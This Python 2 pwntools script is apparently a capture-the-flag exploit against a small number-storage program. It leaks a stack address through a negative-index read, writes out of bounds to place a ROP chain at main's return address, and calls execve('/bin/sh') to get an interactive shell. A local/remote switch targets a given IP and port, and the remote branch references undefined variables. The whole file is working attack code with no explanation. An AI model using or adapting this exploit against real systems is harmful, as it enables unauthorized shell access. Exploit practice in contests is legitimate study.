#!/usr/bin/env python2

import sys
import argparse
from pwn import *

def read(index):
    p.sendline("read")
    p.sendline(str(index))
    p.recvuntil("] is ")
    value = p.recvuntil("Completed read command successfully", drop=True)
    value = value.strip()
    return int(value)

def store(index, number, suffix=""):
    p.sendline("store")
    p.sendline(str(number))
    p.recvuntil("Index: ")
    p.sendline(str(index))

    response = p.recvuntil("store")
    p.clean()
    if "ERROR!" in response:
        log.warning("Storing at index %s failed." % index)
        return False


    return True

def overwrite_addr(addr, number_list_addr, value, suffix=""):
   index = (addr - 0x100000000) - number_list_addr
   index /= 4
   store(index, value, suffix)

def exploit():
    loot['number_list'] = read(-10)
    loot['main_ret'] = loot['number_list'] + 0x1c4

    log.info("Number list addr : 0x%x" % loot['number_list'])
    log.info("Main ret addr : 0x%x" % loot['main_ret'])

    # fgets()
    RET             = 0x080481b2
    MOV_EAX_POP_EDI = 0x08096f06
    SUB_EAX_POP_EBX = 0x08054daa
    POP_ECX_POP_EBX = 0x0806f3d1
    POP_EBX_POP_EDI = 0x080bee63
    MOV_EDX_FF      = 0x08054cc5
    INC_EDX_POP_ES  = 0x08067b99
    INT_80          = 0x08048eaa

    overwrite_addr(loot['main_ret'], loot['number_list'], RET)
    overwrite_addr(loot['main_ret']+4, loot['number_list'], MOV_EAX_POP_EDI)

    overwrite_addr(loot['main_ret']+12, loot['number_list'], RET)
    overwrite_addr(loot['main_ret']+16, loot['number_list'], SUB_EAX_POP_EBX)

    overwrite_addr(loot['main_ret']+24, loot['number_list'], POP_ECX_POP_EBX)
    overwrite_addr(loot['main_ret']+28, loot['number_list'], 0x0)

    overwrite_addr(loot['main_ret']+36, loot['number_list'], POP_EBX_POP_EDI)
    overwrite_addr(loot['main_ret']+40, loot['number_list'], loot['main_ret']+72)

    overwrite_addr(loot['main_ret']+48, loot['number_list'], MOV_EDX_FF)
    overwrite_addr(loot['main_ret']+52, loot['number_list'], INC_EDX_POP_ES)

    overwrite_addr(loot['main_ret']+60, loot['number_list'], INT_80)

    overwrite_addr(loot['main_ret']+72, loot['number_list'], u32("/bin"))
    overwrite_addr(loot['main_ret']+76, loot['number_list'], u32("/sh\x00"))


    p.sendline("quit")
    p.interactive()


if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "%s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try :
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    libc = binary.libc
    env = args.env
    loot = {}

    if env == "local":
        p = process([args.binary])
        log.info(util.proc.pidof(p))

    elif env == "remote":
        p = remote(ip, port)

    pause()
    exploit()
